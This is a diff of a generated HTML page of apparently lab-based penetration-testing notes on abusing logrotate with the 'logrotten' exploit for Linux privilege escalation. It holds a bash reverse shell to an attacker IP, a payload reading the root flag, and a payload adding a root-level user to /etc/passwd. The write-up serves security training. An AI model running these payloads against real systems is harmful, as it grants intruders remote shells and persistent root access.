@@ -26810,7 +26810,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </ul>
 <p>The function of the rotation itself consists in renaming the log files. This tool is usually started periodically via <code>cron</code> and controlled via the configuration file <code>/etc/logrotate.conf</code>. Within this file, it contains global settings that determine the function of <code>logrotate</code>.</p>
 <p>To force a new rotation on the same day, we can set the date after the individual log files in the status file <code>/var/lib/logrotate.status</code>. Example, forcing rotation on samba:</p>
-<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-0-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1"></a><span class="go">/var/log/samba/log.smbd&quot; 2022-8-3</span>
+<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-0-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1"></a><span class="go">/var/log/samba/log.smbd" 2022-8-3</span>
 </span></code></pre></div></td></tr></table></div>
 <p><code>/etc/logrotate.d/</code> directory contains the corresponding configuration files for each service.</p>
 <h2 id="logrotten">logrotten</h2>
@@ -26849,10 +26849,10 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <p>Next, we need a payload to be executed.</p>
 <p>In this example, we will run a simple bash-based reverse shell with the <code>IP</code> and <code>port</code> of our VM that we use to attack the target system.
  
-<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-6-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1"></a><span class="go">echo &#39;sh -i &gt;&amp; /dev/tcp/10.10.15.41/1234 0&gt;&amp;1&#39; &gt; payload</span>
+<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-6-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1"></a><span class="go">echo 'sh -i &gt;&amp; /dev/tcp/10.10.15.41/1234 0&gt;&amp;1' &gt; payload</span>
 </span></code></pre></div></td></tr></table></div></p>
 <p>However, before running the exploit, we need to determine which option <code>logrotate</code> uses in <code>logrotate.conf</code>.</p>
-<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-7-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1"></a><span class="go">grep &quot;create\|compress&quot; /etc/logrotate.conf | grep -v &quot;#&quot;</span>
+<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-7-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1"></a><span class="go">grep "create\|compress" /etc/logrotate.conf | grep -v "#"</span>
 </span></code></pre></div></td></tr></table></div>
 <p>If the output is "create", then we will use the exploit adapted to this function.</p>
 <div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-8-1">1</a></span>
@@ -26886,7 +26886,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-10-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1"></a>./logrotten -p ./payload ~/backups/access.log
 </span></code></pre></div></td></tr></table></div>
 <p>Output: </p>
-<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-11-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1"></a>./logrotten: /lib/x86_64-linux-gnu/libc.so.6: version GLIBC_2.34&#39; not found (required by ./logrotten)
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-11-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1"></a>./logrotten: /lib/x86_64-linux-gnu/libc.so.6: version GLIBC_2.34' not found (required by ./logrotten)
 </span></code></pre></div></td></tr></table></div>
 <p>The issue is that the <code>logrotten</code> binary compiled requires <strong>GLIBC 2.34</strong>, but the target system has an older version. Here’s how to fix this:</p>
 <p><strong>1.</strong> Check the Target System's GLIBC Version</p>
@@ -26939,7 +26939,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </span></code></pre></div></td></tr></table></div>
 <p>Output is 3.11.</p>
 <p>Craft the payload:</p>
-<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-19-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1"></a>echo &#39;cat /root/flag.txt &gt; /home/htb-student/flag.txt&#39; &gt; payload
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-19-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1"></a>echo 'cat /root/flag.txt &gt; /home/htb-student/flag.txt' &gt; payload
 </span></code></pre></div></td></tr></table></div>
 <p>Run the exploit:</p>
 <div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-20-1"> 1</a></span>
@@ -26968,7 +26968,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </span><span id="__span-20-11"><a id="__codelineno-20-11" name="__codelineno-20-11"></a>./logrotten -p payload /home/htb-student/backups/access.log
 </span><span id="__span-20-12"><a id="__codelineno-20-12" name="__codelineno-20-12"></a>
 </span><span id="__span-20-13"><a id="__codelineno-20-13" name="__codelineno-20-13"></a># Open another ssh connection with the target host and trigger the log rotation mechanism for access.log
-</span><span id="__span-20-14"><a id="__codelineno-20-14" name="__codelineno-20-14"></a>echo &quot;This is a string&quot; &gt; /home/htb-student/backups/access.log
+</span><span id="__span-20-14"><a id="__codelineno-20-14" name="__codelineno-20-14"></a>echo "This is a string" &gt; /home/htb-student/backups/access.log
 </span></code></pre></div></td></tr></table></div>
 <p>As an outcome (we need to run this even 3 times), we will obtain the flag.txt in our /home/htb-student folder.</p>
 <div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-21-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1"></a>cat /home/htb-student/flag.txt
@@ -26994,18 +26994,18 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <span class="normal"><a href="#__codelineno-22-16">16</a></span>
 <span class="normal"><a href="#__codelineno-22-17">17</a></span>
 <span class="normal"><a href="#__codelineno-22-18">18</a></span>
-<span class="normal"><a href="#__codelineno-22-19">19</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1"></a># Generate a hashed password in the target host. My password is going to be &quot;password123&quot;
+<span class="normal"><a href="#__codelineno-22-19">19</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1"></a># Generate a hashed password in the target host. My password is going to be "password123"
 </span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2"></a>openssl passwd -1 password123
 </span><span id="__span-22-3"><a id="__codelineno-22-3" name="__codelineno-22-3"></a>
 </span><span id="__span-22-4"><a id="__codelineno-22-4" name="__codelineno-22-4"></a># Craft the payload. This payload will add the user lele with password password123 with the home directory set to root
 </span><span id="__span-22-5"><a id="__codelineno-22-5" name="__codelineno-22-5"></a># username:hashed_password:UID:GID:comment:home_directory:shell
-</span><span id="__span-22-6"><a id="__codelineno-22-6" name="__codelineno-22-6"></a>echo &quot;echo echo &quot;echo &#39;lele:\$1\$twJx/0OM\$PhLy4vWVoaEWLrd52BDbq/:0:0:lele:/root:/bin/bash&#39; &gt;&gt; /etc/passwd&quot; &gt; payload
+</span><span id="__span-22-6"><a id="__codelineno-22-6" name="__codelineno-22-6"></a>echo "echo echo "echo 'lele:\$1\$twJx/0OM\$PhLy4vWVoaEWLrd52BDbq/:0:0:lele:/root:/bin/bash' &gt;&gt; /etc/passwd" &gt; payload
 </span><span id="__span-22-7"><a id="__codelineno-22-7" name="__codelineno-22-7"></a>
 </span><span id="__span-22-8"><a id="__codelineno-22-8" name="__codelineno-22-8"></a># Run the exploit
 </span><span id="__span-22-9"><a id="__codelineno-22-9" name="__codelineno-22-9"></a>./logrotten -p payload /home/htb-student/backups/access.log
 </span><span id="__span-22-10"><a id="__codelineno-22-10" name="__codelineno-22-10"></a>
 </span><span id="__span-22-11"><a id="__codelineno-22-11" name="__codelineno-22-11"></a># Open another ssh connection with the target host and trigger the log rotation mechanism for access.log
-</span><span id="__span-22-12"><a id="__codelineno-22-12" name="__codelineno-22-12"></a>echo &quot;This is a string&quot; &gt; /home/htb-student/backups/access.log
+</span><span id="__span-22-12"><a id="__codelineno-22-12" name="__codelineno-22-12"></a>echo "This is a string" &gt; /home/htb-student/backups/access.log
 </span><span id="__span-22-13"><a id="__codelineno-22-13" name="__codelineno-22-13"></a>
 </span><span id="__span-22-14"><a id="__codelineno-22-14" name="__codelineno-22-14"></a># Now we wait for some minutes and after a while, we can cat the /etc/passwd file and see the lele user in there:
 </span><span id="__span-22-15"><a id="__codelineno-22-15" name="__codelineno-22-15"></a>cat /etc/passwd
